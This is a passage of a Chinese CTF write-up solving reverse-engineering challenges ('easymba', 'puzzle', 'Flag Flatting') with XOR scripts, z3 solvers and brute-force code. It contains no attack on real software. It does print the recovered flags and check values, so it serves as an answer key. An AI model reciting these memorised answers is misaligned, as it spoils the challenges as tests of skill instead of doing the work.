<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">text=<span class="hljs-string">&quot;0ops&quot;</span><br><span class="hljs-number">0xD460A44150102</span><br>didit=[<span class="hljs-number">0x02</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x0a</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x0d</span>]<br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    a=<span class="hljs-built_in">ord</span>(text[i%<span class="hljs-number">4</span>])<br>    b=didit[i]<br>    b=b^a<br>    <span class="hljs-comment"># print(chr(b))</span><br>    result=result+<span class="hljs-built_in">chr</span>(b)<br><span class="hljs-built_in">print</span>(result)<br><br><span class="hljs-comment"># output:  2ne7:)&#125;</span><br></code></pre></div></td></tr></table></figure>
<p>此时获得的flag如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">0ops</span>&#123;check_y<span class="hljs-number">0</span>ur_r<span class="hljs-number">3</span>ve<span class="hljs-number">2</span>sing_j<span class="hljs-number">0</span>u<span class="hljs-number">2</span>ne<span class="hljs-number">7</span>:)&#125;<br></code></pre></div></td></tr></table></figure>
<p>但是因为还有没有调试的情况下加进去的改变前五位的代码，所以我们要提前计算前五位的值，使其改变后才等于check，而不是一开始就是check，这样改变后就不是check了。</p>
<p>计算改变前前五位的脚本如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>=[<span class="hljs-number">0</span>x<span class="hljs-number">47</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span>c,<span class="hljs-number">0</span>x<span class="hljs-number">25</span>,<span class="hljs-number">0</span>x<span class="hljs-number">11</span>,<span class="hljs-number">0</span>x<span class="hljs-number">1</span>f]<br><span class="hljs-attribute">b</span>=<span class="hljs-string">&quot;check&quot;</span><br><br><span class="hljs-attribute">for</span> i in  range(len(a)):<br>    <span class="hljs-attribute">c</span>=ord(b[i])^a[i]<br>    <span class="hljs-attribute">print</span>(chr(c), end=&#x27;&#x27;)<br>   <br>   <br><span class="hljs-comment">#output:  $t@rt</span><br></code></pre></div></td></tr></table></figure>
<p>所以最终的flag如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">0ops</span>&#123;$t@rt_y<span class="hljs-number">0</span>ur_r<span class="hljs-number">3</span>ve<span class="hljs-number">2</span>sing_j<span class="hljs-number">0</span>u<span class="hljs-number">2</span>ne<span class="hljs-number">7</span>:)&#125;<br></code></pre></div></td></tr></table></figure>
<h3 id="easymba"><a class="markdownIt-Anchor" href="#easymba"></a> easymba</h3>
<p>求出来四个check解即可</p>
<p>第一个手算</p>
<p>第二三个z3求解</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>a= BitVec(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">32</span>)<br>s = Solver()<br><br>s.add(~(<span class="hljs-number">3</span> * (a &amp; <span class="hljs-number">0x5427F672</span>) - (a | <span class="hljs-number">0xABD8098D</span>) - a+ <span class="hljs-number">0x57B0131A</span>) == <span class="hljs-number">1352221957</span>)<br><br><span class="hljs-built_in">print</span>(s.check())<br><span class="hljs-built_in">print</span>(s.model())<br><br>a=<span class="hljs-number">79606647</span><br><span class="hljs-built_in">print</span>(~(<span class="hljs-number">3</span> * (a &amp; <span class="hljs-number">0x5427F672</span>) - (a | <span class="hljs-number">0xABD8098D</span>) - a+ <span class="hljs-number">0x57B0131A</span>) == <span class="hljs-number">1352221957</span>)<br><br></code></pre></div></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>a1= BitVec(<span class="hljs-string">&#x27;a1&#x27;</span>,<span class="hljs-number">32</span>)<br>s = Solver()<br><br>s.add(<span class="hljs-number">4</span> * ((~a1 &amp; <span class="hljs-number">0xADFDBC7B</span>) + <span class="hljs-number">2</span> * ~(~a1 | <span class="hljs-number">0xADFDBC7B</span>))<br>     + -<span class="hljs-number">3</span> * (~a1 | <span class="hljs-number">0xADFDBC7B</span>)<br>     + <span class="hljs-number">3</span> * ~(a1 | <span class="hljs-number">0xADFDBC7B</span>)<br>     - ((a1 ^ <span class="hljs-number">0xADFDBC7B</span>)<br>      - <span class="hljs-number">10</span> * (a1 &amp; <span class="hljs-number">0xADFDBC7B</span>)) == <span class="hljs-number">590670598</span>)<br><br><span class="hljs-built_in">print</span>(s.check())<br><span class="hljs-built_in">print</span>(s.model())<br><br>a=<span class="hljs-number">84381514</span><br><span class="hljs-built_in">print</span>(<span class="hljs-number">4</span> * ((~a1 &amp; <span class="hljs-number">0xADFDBC7B</span>) + <span class="hljs-number">2</span> * ~(~a1 | <span class="hljs-number">0xADFDBC7B</span>))<br>     + -<span class="hljs-number">3</span> * (~a1 | <span class="hljs-number">0xADFDBC7B</span>)<br>     + <span class="hljs-number">3</span> * ~(a1 | <span class="hljs-number">0xADFDBC7B</span>)<br>     - ((a1 ^ <span class="hljs-number">0xADFDBC7B</span>)<br>      - <span class="hljs-number">10</span> * (a1 &amp; <span class="hljs-number">0xADFDBC7B</span>)) == <span class="hljs-number">590670598</span>)<br><br></code></pre></div></td></tr></table></figure>
<p>第四个z3求不出来，暴力了一下，有五六个解，挨个试一下，到最后一个就成功了</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> a1 = <span class="hljs-number">0</span>; a1 &lt;= <span class="hljs-number">0x10000000</span>; a1++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-number">11</span> * ~(a1 ^ <span class="hljs-number">0xE76EDA24</span>) + <span class="hljs-number">4</span> * ~(~a1 | <span class="hljs-number">0xE76EDA24</span>) - (<span class="hljs-number">6</span> * (a1 &amp; <span class="hljs-number">0xE76EDA24</span>) + <span class="hljs-number">12</span> * ~(a1 | <span class="hljs-number">0xE76EDA24</span>)) + <span class="hljs-number">-5</span> * a1 - <span class="hljs-number">2</span> * ~(a1 | <span class="hljs-number">0xCD731B78</span>) - (a1 | <span class="hljs-number">0x328CE487</span>) + <span class="hljs-number">3</span> * (a1 &amp; <span class="hljs-number">0xCD731B78</span>) - <span class="hljs-number">2</span> * (<span class="hljs-number">-2</span> * (a1 &amp; <span class="hljs-number">0x328CE487</span>) - (a1 | <span class="hljs-number">0x328CE487</span>)) == <span class="hljs-number">-979756886</span>)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;answer:   &quot;</span> &lt;&lt; a1 &lt;&lt; endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>最终答案</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">2833100173</span><br><span class="hljs-number">79606647</span><br><span class="hljs-number">84381514</span><br><span class="hljs-number">69863554</span><br></code></pre></div></td></tr></table></figure>
<h3 id="puzzle"><a class="markdownIt-Anchor" href="#puzzle"></a> puzzle</h3>
<p>要求我们输入48个图，对这个图的要求是满足下面的条件</p>
<p><img src="/posts/764dc2d/image-20230309153410451.png" srcset="/img/loading.gif" lazyload alt="image-20230309153410451"></p>
<p>推了半天原理无果，直接暴力了一下，先尝试了2^21次方，考虑自环边，发现有些图有多解，多的解正好是包含自环边的，所以猜测可能不包含自环边，那就可以只考虑2^15次方了，跑的飞快。</p>
<p>运行下面代码前半部分我们就可以拿到图的数据了，输入进去后拿到提示</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">(=) Good Job!<br>The flag <span class="hljs-keyword">is</span> <span class="hljs-keyword">of</span> the <span class="hljs-keyword">format</span>: <span class="hljs-number">0</span>ops&#123;[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]+&#125;<br>What wrapped <span class="hljs-keyword">between</span> <span class="hljs-string">&#x27;&#123;&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;&#125;&#x27;</span> are graphs you just <span class="hljs-keyword">input</span>. <br>Try <span class="hljs-keyword">to</span> decode them <span class="hljs-keyword">and</span> upload your answer!<br>MD5 <span class="hljs-keyword">of</span> the flag: d3fa2afbb47f5e2245ab5c2391f5cff2<br></code></pre></div></td></tr></table></figure>
<p>一开始走了弯路，以为是和论文有关，因为本题确实和几篇论文的题目很接近，后来看群发现可以问flag位数，就去询问了一下，顺便问了手和论文有无关联，得到否定的回答后就果断放弃了那刚下完的七八篇论文了。</p>
<p>然后发散了一下脑洞，画着画着就突然发现，六个点，感觉和以前计算器的显示有点像，可以组成数字，摆了几个就发现果然，就是数字，所以记录了下摆出0-9对应的边，对比一下就可以得到答案了。</p>
<p><img src="/posts/764dc2d/mmexport1678711945516.jpg" srcset="/img/loading.gif" lazyload alt="mmexport1678711945516"></p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">import</span> json<br>#前半部分，获取图<br># 从二进制文件里取出来经过处理的数据，用在下面不等式里面<br><span class="hljs-function">with <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-string">&quot;store_node.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)</span> as f:</span><br><span class="hljs-function">   store_graph_edge</span>= f.read()<br>   store_graph_edge=json.loads(store_graph_edge)<br><span class="hljs-meta">#    print(len(store_graph_edge))</span><br>   <br><br># 遍历的索引数组<br>bintoedge=&#123;&#125;<br><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> j in range(<span class="hljs-number">6</span>):<br>    <span class="hljs-keyword">for</span> k in range(j+<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):#不考虑自环<br>        bintoedge[i]=[j,k]<br>        i+=<span class="hljs-number">1</span><br><br>dn=len(bintoedge)<br>def check(k):<br>    <span class="hljs-keyword">for</span> m in range(<span class="hljs-number">6</span>):<br>        <span class="hljs-keyword">for</span> n in range(<span class="hljs-number">6</span>):<br>            <span class="hljs-keyword">if</span> graph_edge.get(<span class="hljs-number">6</span>*m+n,<span class="hljs-number">0</span>):<br>                <span class="hljs-keyword">for</span> ii in range(<span class="hljs-number">6</span>):<br>                    <span class="hljs-keyword">if</span>  graph_edge.get(<span class="hljs-number">6</span>*m+ii,<span class="hljs-number">0</span>)!=<span class="hljs-number">1</span> \<br>                    <span class="hljs-keyword">and</span> store_graph_edge[<span class="hljs-number">36</span>*k+<span class="hljs-number">6</span>*m+n]-graph_node_point.get(n,<span class="hljs-number">0</span>) &lt;= store_graph_edge[<span class="hljs-number">36</span> * k + <span class="hljs-number">6</span> * m + ii] - graph_node_point.get(ii, <span class="hljs-number">0</span>):<br>                        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>result=[]<br><span class="hljs-keyword">for</span> k  in range(<span class="hljs-number">48</span>):<br>    <span class="hljs-meta"># print(<span class="hljs-meta-string">&quot;Graph:  &quot;</span>,k)</span><br>    t=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>**dn<span class="hljs-number">-1</span>):<br>        graph_edge=&#123;&#125;<br>        graph_node_point=&#123;&#125;<br>        stri=bin(i)[<span class="hljs-number">2</span>:]<br>        stri=<span class="hljs-string">&#x27;0&#x27;</span>*(dn-len(stri))+stri<br>        <span class="hljs-keyword">for</span> l in range(len(stri)):<br>            <span class="hljs-keyword">if</span> stri[dn<span class="hljs-number">-1</span>-l]==<span class="hljs-string">&#x27;1&#x27;</span>:<br>                graph_edge[<span class="hljs-number">6</span>*bintoedge[l][<span class="hljs-number">0</span>]+bintoedge[l][<span class="hljs-number">1</span>]]=<span class="hljs-number">1</span><br>                graph_edge[<span class="hljs-number">6</span>*bintoedge[l][<span class="hljs-number">1</span>]+bintoedge[l][<span class="hljs-number">0</span>]]=<span class="hljs-number">1</span><br>                graph_node_point[bintoedge[l][<span class="hljs-number">0</span>]]=graph_node_point.get(bintoedge[l][<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) +<span class="hljs-number">1</span><br>                graph_node_point[bintoedge[l][<span class="hljs-number">1</span>]]=graph_node_point.get(bintoedge[l][<span class="hljs-number">1</span>], <span class="hljs-number">0</span>) +<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> check(k):<br>            t=<span class="hljs-number">1</span><br>            num=stri.count(<span class="hljs-string">&#x27;1&#x27;</span>)<br>            print(num)<br>            <span class="hljs-keyword">for</span> l in range(len(stri)):<br>                <span class="hljs-keyword">if</span> stri[dn<span class="hljs-number">-1</span>-l]==<span class="hljs-string">&#x27;1&#x27;</span>:<br>                    print(bintoedge[l][<span class="hljs-number">0</span>],bintoedge[l][<span class="hljs-number">1</span>])<br>                    result[k].append([bintoedge[l][<span class="hljs-number">0</span>],bintoedge[l][<span class="hljs-number">1</span>]])<br>    <span class="hljs-keyword">if</span> t==<span class="hljs-number">0</span>:<br>        print(<span class="hljs-number">0</span>)<br><br><br><br>#后半部分，获取图构成的数字<br>d=&#123;&#125;<br>d[<span class="hljs-number">0</span>]=[[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">2</span>,<span class="hljs-number">4</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">5</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]]<br>d[<span class="hljs-number">1</span>]=[[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">5</span>]]<br>d[<span class="hljs-number">2</span>]=[[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">2</span>,<span class="hljs-number">4</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]]<br>d[<span class="hljs-number">3</span>]=[[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">5</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]]<br>d[<span class="hljs-number">4</span>]=[[<span class="hljs-number">0</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">5</span>]]<br>d[<span class="hljs-number">5</span>]=[[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">5</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]]<br>d[<span class="hljs-number">6</span>]=[[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">2</span>,<span class="hljs-number">4</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">5</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]]<br>d[<span class="hljs-number">7</span>]=[[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">5</span>]]<br>d[<span class="hljs-number">8</span>]=[[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">2</span>,<span class="hljs-number">4</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">5</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]]<br>d[<span class="hljs-number">9</span>]=[[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">5</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]]<br><br><span class="hljs-meta"># output the result</span><br><span class="hljs-keyword">for</span> k in range(<span class="hljs-number">48</span>):<br>    <span class="hljs-meta"># print(<span class="hljs-meta-string">&quot;Graph &quot;</span>,k)</span><br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">if</span> result[k]==d[i]:<br>            print(i,end=<span class="hljs-string">&#x27;&#x27;)</span><br><span class="hljs-string">            continue</span><br></code></pre></div></td></tr></table></figure>
<h3 id="flag-flatting"><a class="markdownIt-Anchor" href="#flag-flatting"></a> Flag Flatting</h3>
<p>没什么可以多说的，就是照着汇编一点点耐心地走下去，理清其中的过程。</p>
<p>直接看IDA反汇编的结果都是ifelse嵌套，很难看懂过程，可以跳转根据汇编来找，然后if里面的具体代码可以看一下反汇编结果，一个超级长的跳转过程。</p>
<p>主要过程如下：</p>
<ul>
<li>
<p>第一步：<br>
flag括号内的每个字符乘以0xD9</p>
</li>
<li>
<p>第二步：<br>
flag括号内的每个字符加上0x6c</p>
</li>
<li>
<p>第三步:</p>
<p>flag括号内的每个字符都进行如下的运算</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">*((_BYTE *)*v177 + *v173) = (*(_BYTE *)v173 &amp; <span class="hljs-number">0xF7</span> | ~*(_BYTE *)v173 &amp; <span class="hljs-number">8</span>) ^ (*((_BYTE *)*v177 + *v173) &amp; <span class="hljs-number">0xF7</span> | ~*((_BYTE *)*v177 + *v173) &amp; <span class="hljs-number">8</span>);<br></code></pre></div></td></tr></table></figure>
<p>相当于</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>[i] == (i &amp; <span class="hljs-number">0</span>xF<span class="hljs-number">7</span> | ~i &amp; <span class="hljs-number">8</span>) ^ (flag[i] &amp; <span class="hljs-number">0</span>xF<span class="hljs-number">7</span> | ~flag[i]&amp; <span class="hljs-number">8</span>)<br></code></pre></div></td></tr></table></figure>
</li>
<li>
<p>第四步:</p>
</li>
</ul>
  <figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">v49 = *((<span class="hljs-keyword">unsigned</span> __int8 *)*v177 + *v175 + *v173) &lt;&lt; (<span class="hljs-number">8</span> * (<span class="hljs-number">0x79</span> - *v175 - <span class="hljs-number">0x77</span>));<br>*v176 = v49 ^ *v176 | v49 &amp; *v176;<br></code></pre></div></td></tr></table></figure>
<p>每次取三个元素，将其ascii码转化成二进制，从左往右依次排列，组成一个24位的数</p>
<ul>
<li>
<p>第五步：</p>
<p>从左往右每次从这个24位数里面取出6位，作为索引去下面的map字符串取出字符组成字符串s，每三个变化后的flag字符可以组成s中的4个字符</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">*((_BYTE *)*v178<br>+ *v174<br>- <span class="hljs-number">1999169702</span><br>- *v175<br>+ <span class="hljs-number">1999169705</span>) = off_603058[*v176 &amp; (*v176 ^ <span class="hljs-number">0xFFFFFFC0</span>)];<br>*v176 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)*v176 &gt;&gt; <span class="hljs-number">6</span>;<br></code></pre></div></td></tr></table></figure>
<p>map</p>
<figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">&gt;kp:wm<span class="hljs-number">06</span>fqzsx<span class="hljs-number">9</span>o?&lt;<span class="hljs-number">4</span>_-+^d<span class="hljs-variable">#3</span>&#123;!&#x27;e<span class="hljs-number">8</span>]`~*ya|gbj)$i<span class="hljs-number">5</span>n<span class="hljs-number">1</span>/[<span class="hljs-keyword">c</span>&amp;urh\\&#125;<span class="hljs-number">2</span><span class="hljs-comment">;7%v(@lt</span><br></code></pre></div></td></tr></table></figure>
<p>s</p>
<figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir">x0<span class="hljs-variable">@ce21f</span>&amp;[<span class="hljs-number">4</span>gl`jmwxo<span class="hljs-variable">$tsdvf</span>/&gt;ag5cem<span class="hljs-variable">$5y</span>%<span class="hljs-number">9</span>vgjd\\_h/<span class="hljs-symbol">:<span class="hljs-string">&#x27;~]#b~fqw~q:`&lt;xbm_t6k&#x27;</span>u*l?rj!</span>)xsf[q`<span class="hljs-symbol">:vn9?_2h&gt;</span><br></code></pre></div></td></tr></table></figure>
</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs py"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#  &quot;x0@ce21f&amp;[4gl`jmwxo$tsdvf/&gt;ag5cem$5y%9vgjd\\_h/:&#x27;~]#b~fqw~q:`&lt;xbm_t6k&#x27;u*l?rj!)xsf[q`:vn9?_2h&gt;&quot;</span><br>s=[<span class="hljs-number">0x78</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x66</span>,<br><span class="hljs-number">0x26</span>,<span 